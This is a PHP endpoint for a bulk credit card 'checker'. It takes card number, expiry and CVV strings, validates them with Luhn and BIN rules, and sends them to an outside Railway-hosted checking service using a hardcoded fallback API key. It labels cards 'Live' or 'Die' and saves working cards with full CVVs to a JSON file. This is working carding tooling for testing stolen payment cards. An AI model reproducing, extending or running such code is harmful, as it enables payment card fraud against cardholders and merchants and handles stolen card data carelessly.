<?php
/**
 * API Endpoint for CC Checker
 * Enhanced with robust bank algorithm validation
 * 
 * @author OshekharO
 */

// Increase limits for large payloads
@ini_set('post_max_size', '64M');
@ini_set('upload_max_filesize', '64M');
@ini_set('max_input_vars', 10000);
@ini_set('max_execution_time', 300);

// Load security middleware
require_once __DIR__ . '/security.php';

// Run security checks before processing
$securityError = runSecurityChecks();
if ($securityError !== null) {
    echo json_encode(['error' => 4, 'msg' => "<div><b style='color:#ef4444;'>Security Error</b> | {$securityError}</div>"]);
    exit;
}

// Load configuration if available
if (file_exists('config.php')) {
    require_once 'config.php';
} else {
    // Default settings if config.php doesn't exist
    define('ENABLE_LUHN_CHECK', true);
    define('MIN_CARD_LENGTH', 13);
    define('MAX_CARD_LENGTH', 19);
    define('MIN_VALID_YEAR', 2024);
}

/**
 * Card type definitions with IIN/BIN ranges
 * Based on ISO/IEC 7812 standards
 */
$CARD_TYPES = [
    'visa' => [
        'name' => 'Visa',
        'patterns' => ['/^4/'],
        'lengths' => [13, 16, 19],
        'cvv_length' => 3
    ],
    'mastercard' => [
        'name' => 'Mastercard',
        'patterns' => ['/^5[1-5]/', '/^2(?:2[2-9][1-9]|2[3-9]|[3-6]|7[0-1]|720)/'],
        'lengths' => [16],
        'cvv_length' => 3
    ],
    'amex' => [
        'name' => 'American Express',
        'patterns' => ['/^3[47]/'],
        'lengths' => [15],
        'cvv_length' => 4
    ],
    'discover' => [
        'name' => 'Discover',
        'patterns' => ['/^6(?:011|5|4[4-9]|22(?:1(?:2[6-9]|[3-9])|[2-8]|9(?:[01]|2[0-5])))/'],
        'lengths' => [16, 19],
        'cvv_length' => 3
    ],
    'diners' => [
        'name' => 'Diners Club',
        'patterns' => ['/^3(?:0[0-5]|[68])/'],
        'lengths' => [14, 16, 19],
        'cvv_length' => 3
    ],
    'jcb' => [
        'name' => 'JCB',
        'patterns' => ['/^(?:2131|1800|35)/'],
        'lengths' => [16, 17, 18, 19],
        'cvv_length' => 3
    ],
    'unionpay' => [
        'name' => 'UnionPay',
        'patterns' => ['/^62/'],
        'lengths' => [16, 17, 18, 19],
        'cvv_length' => 3
    ],
    'maestro' => [
        'name' => 'Maestro',
        'patterns' => ['/^(?:5018|5020|5038|5893|6304|6759|676[1-3])/'],
        'lengths' => [12, 13, 14, 15, 16, 17, 18, 19],
        'cvv_length' => 3
    ]
];

/**
 * Validate card number using Luhn algorithm (ISO/IEC 7812-1)
 * @param string $number Card number (digits only)
 * @return bool True if valid
 */
function validateLuhn($number) {
    $number = preg_replace('/\D/', '', $number);
    
    if (empty($number)) {
        return false;
    }
    
    $sum = 0;
    $length = strlen($number);
    
    for ($i = $length - 1; $i >= 0; $i--) {
        $digit = intval($number[$i]);
        
        if (($length - $i) % 2 == 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        
        $sum += $digit;
    }
    
    return ($sum % 10) === 0;
}

/**
 * Detect card type based on IIN/BIN ranges
 * @param string $number Card number
 * @return array|null Card type info or null
 */
function detectCardType($number) {
    global $CARD_TYPES;
    $cleanNumber = preg_replace('/\D/', '', $number);
    
    foreach ($CARD_TYPES as $key => $cardType) {
        foreach ($cardType['patterns'] as $pattern) {
            if (preg_match($pattern, $cleanNumber)) {
                return array_merge(['key' => $key], $cardType);
            }
        }
    }
    
    return null;
}

/**
 * Validate card length based on card type
 * @param string $number Card number
 * @param array|null $cardType Card type info
 * @return bool True if length is valid
 */
function isValidLength($number, $cardType) {
    $cleanNumber = preg_replace('/\D/', '', $number);
    $length = strlen($cleanNumber);
    
    if ($cardType === null) {
        // Generic validation: 13-19 digits
        return $length >= MIN_CARD_LENGTH && $length <= MAX_CARD_LENGTH;
    }
    
    return in_array($length, $cardType['lengths']);
}

/**
 * Validate CVV based on card type
 * @param string $cvv CVV code
 * @param array|null $cardType Card type info
 * @return bool True if CVV is valid
 */
function isValidCVV($cvv, $cardType) {
    if (!preg_match('/^\d+$/', $cvv)) {
        return false;
    }
    
    $cvvLength = strlen($cvv);
    
    if ($cardType === null) {
        // Allow 3 or 4 digits for unknown card types
        return $cvvLength === 3 || $cvvLength === 4;
    }
    
    return $cvvLength === $cardType['cvv_length'];
}

/**
 * Convert 2-digit year (YY) to 4-digit year (YYYY)
 * Uses current century for credit card expiry (cards valid for ~10 years)
 * @param string $year Year string (2 or 4 digits)
 * @return int|null Full 4-digit year, or null if invalid
 */
function convertToFullYear($year) {
    // Validate that year contains only digits
    if (!preg_match('/^\d+$/', $year)) {
        return null;
    }
    
    $yearNum = intval($year);
    $yearLen = strlen($year);
    
    // If already 4 digits, return as-is
    if ($yearLen === 4) {
        return $yearNum;
    }
    
    // For 2-digit year: add current century
    // Credit cards typically have expiry within 10 years, so 2000s is safe
    if ($yearLen === 2) {
        return 2000 + $yearNum;
    }
    
    // Invalid length (not 2 or 4 digits)
    return null;
}

/**
 * Validate expiry date
 * @param string $month Expiry month (MM)
 * @param string $year Expiry year (YY or YYYY)
 * @return array Validation result with 'valid' and 'message'
 */
function validateExpiry($month, $year) {
    $monthNum = intval($month);
    $yearNum = convertToFullYear($year);
    $currentYear = intval(date('Y'));
    $currentMonth = intval(date('n'));

    if ($monthNum < 1 || $monthNum > 12) {
        return ['valid' => false, 'message' => 'Invalid month (01-12)'];
    }

    if ($yearNum === null) {
        return ['valid' => false, 'message' => 'Invalid year format (use YY or YYYY)'];
    }

    if ($yearNum < $currentYear) {
        return ['valid' => false, 'message' => 'Card expired (year)'];
    }

    if ($yearNum === $currentYear && $monthNum < $currentMonth) {
        return ['valid' => false, 'message' => 'Card expired (month)'];
    }

    // Cards typically valid for 3-5 years, flag suspicious if too far
    if ($yearNum > $currentYear + 10) {
        return ['valid' => false, 'message' => 'Expiry year too far in future'];
    }

    return ['valid' => true, 'message' => 'Valid'];
}

/**
 * Comprehensive card validation
 * @param string $number Card number
 * @param string $month Expiry month
 * @param string $year Expiry year
 * @param string $cvv CVV code
 * @return array Validation result
 */
function validateCard($number, $month, $year, $cvv) {
    $cleanNumber = preg_replace('/\D/', '', $number);
    $cardType = detectCardType($cleanNumber);
    $errors = [];
    
    // Validate card number length
    if (!isValidLength($cleanNumber, $cardType)) {
        $expectedLengths = $cardType 
            ? implode(', ', $cardType['lengths'])
            : (MIN_CARD_LENGTH . '-' . MAX_CARD_LENGTH);
        $errors[] = "Invalid length (expected: {$expectedLengths} digits)";
    }
    
    // Validate Luhn algorithm
    if (defined('ENABLE_LUHN_CHECK') && ENABLE_LUHN_CHECK && !validateLuhn($cleanNumber)) {
        $errors[] = 'Failed Luhn checksum';
    }
    
    // Validate expiry
    $expiryResult = validateExpiry($month, $year);
    if (!$expiryResult['valid']) {
        $errors[] = $expiryResult['message'];
    }
    
    // Validate CVV
    if (!isValidCVV($cvv, $cardType)) {
        $expectedCvv = $cardType ? $cardType['cvv_length'] : '3-4';
        $errors[] = "Invalid CVV (expected: {$expectedCvv} digits)";
    }
    
    return [
        'valid' => empty($errors),
        'card_type' => $cardType,
        'errors' => $errors
    ];
}

/**
 * Create JSON response
 * @param int $errorCode Error code (1=live, 2=die, 3=unknown, 4=info)
 * @param string $message Message to display
 * @return string JSON string
 */
function jsonResponse($errorCode, $message) {
    return json_encode(['error' => $errorCode, 'msg' => $message]);
}

// Getting posted data
if (!isset($_POST["data"]) || empty($_POST["data"])) {
    echo jsonResponse(4, "<div><b style='color:#ef4444;'>Error</b> | No data provided</div>");
    exit;
}

$data = $_POST["data"];

// Splitting the data - support flexible card lengths and year formats (YY or YYYY)
$pattern = "/^([\\d]{" . MIN_CARD_LENGTH . "," . MAX_CARD_LENGTH . "})\\|([\\d]{2})\\|([\\d]{2}|[\\d]{4})\\|([\\d]{3,4})$/";

if (!preg_match($pattern, $data, $matches)) {
    echo jsonResponse(4, "<div><b style='color:#ef4444;'>Invalid Format</b> | Please use format: card_number|MM|YY|CVV or card_number|MM|YYYY|CVV</div>");
    exit;
}

$num = $matches[1];
$expm = $matches[2];
$expy = $matches[3];
$cvv = $matches[4];

// Convert 2-digit year to 4-digit year for display and validation
$fullYear = convertToFullYear($expy);
$format = $num . "|" . $expm . "|" . $fullYear . "|" . $cvv;

// Comprehensive validation
$validation = validateCard($num, $expm, $expy, $cvv);
$cardTypeName = $validation['card_type'] ? $validation['card_type']['name'] : 'Unknown';

if (!$validation['valid']) {
    $errorMsg = implode(', ', $validation['errors']);
    echo jsonResponse(2, "<div><b style='color:#ef4444;'>Die</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | {$errorMsg}</div>");
    exit;
}

// Call external checker API
$ccParam = urlencode($num . '|' . $expm . '|' . $expy . '|' . $cvv);

// API key loaded from environment variable for security
$apiKey = getenv('CHECKER_API_KEY') ?: 'yashikaaa';
$apiBase = getenv('CHECKER_API_URL') ?: 'https://onyxenvbot.up.railway.app/arcenus';
$apiUrl = $apiBase . '/key=' . $apiKey . '/cc=' . $ccParam;

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $apiUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_TIMEOUT => 60,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_USERAGENT => 'MassChecker/1.0',
    CURLOPT_DNS_CACHE_TIMEOUT => 300,
]);

$apiResponse = curl_exec($ch);
$curlError = curl_error($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($apiResponse === false || $httpCode < 200 || $httpCode >= 300) {
    $errMsg = $curlError ?: "HTTP {$httpCode}";
    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | API Error: {$errMsg}</div>");
    exit;
}

$apiData = json_decode($apiResponse, true);

if ($apiData === null) {
    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName})</span> | {$format} | Invalid API response</div>");
    exit;
}

$status = isset($apiData['status']) ? strtolower(trim($apiData['status'])) : '';
$responseMsg = isset($apiData['response']) ? $apiData['response'] : 'No response message';
$gateway = isset($apiData['Gateway']) ? $apiData['Gateway'] : 'Arcenus Auth';

// Classify result based on status
$liveStatuses = ['approved', 'success', 'succeeded', 'charged', 'live', 'authenticated'];
$dieStatuses = ['declined', 'rejected', 'failed', 'die', 'dead', 'insufficient_funds', 'do_not_honor', 'stolen_card', 'lost_card', 'expired_card', 'pickup_card'];

if (in_array($status, $liveStatuses)) {
    // Save live card to data file
    $liveFile = __DIR__ . '/data/live_cards.json';
    $liveCards = file_exists($liveFile) ? json_decode(file_get_contents($liveFile), true) : [];
    if (!is_array($liveCards)) $liveCards = [];
    $liveCards[] = [
        'card' => $format,
        'card_type' => $cardTypeName,
        'gateway' => $gateway,
        'status' => $apiData['status'] ?? $status,
        'response' => $responseMsg,
        'timestamp' => date('Y-m-d H:i:s')
    ];
    file_put_contents($liveFile, json_encode($liveCards, JSON_PRETTY_PRINT), LOCK_EX);

    echo jsonResponse(1, "<div><b style='color:#10b981;'>Live</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | {$responseMsg}</div>");
} elseif (in_array($status, $dieStatuses)) {
    echo jsonResponse(2, "<div><b style='color:#ef4444;'>Die</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | {$responseMsg}</div>");
} else {
    echo jsonResponse(3, "<div><b style='color:#f59e0b;'>Unknown</b> <span style='opacity:0.7;font-size:11px;'>({$cardTypeName} | {$gateway})</span> | {$format} | [{$status}] {$responseMsg}</div>");
}
?>
